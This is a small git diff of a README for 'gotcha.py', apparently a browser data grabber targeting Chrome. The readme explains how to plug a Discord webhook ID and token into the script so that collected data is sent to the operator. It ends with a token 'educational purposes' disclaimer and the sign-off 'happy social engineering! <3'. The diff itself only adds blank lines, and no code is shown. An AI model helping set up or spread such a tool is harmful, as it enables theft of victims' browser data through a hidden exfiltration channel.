@@ -13,8 +13,11 @@ supports Chrome, and Microsoft Edge : can't garauntee its functionality .
 
 1. create a Discord webhook, for more information : https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
 2. find the following variables in, "`gotcha.py`": "whID", "whAT".
+
 "whID" = `Webhook ID`
+
 "whAT" = `Webhook Token/Auth Token`
+
 3. replace these variables with the following found in your Discord webhook.
 
 `https//discord.com/api/webhooks/`(**1**)`/`(**2**)
@@ -49,5 +52,7 @@ all data sent in a neat format, requires a little more effort for setup.
 
 ## disclaimer : 
 i'm not responsible, nor am i liable for any damages caused by others distributing, or using this for malicious purposes.
+
 this is solely for educational purposes, and no harm is intended.
+
 happy social engineering! <3
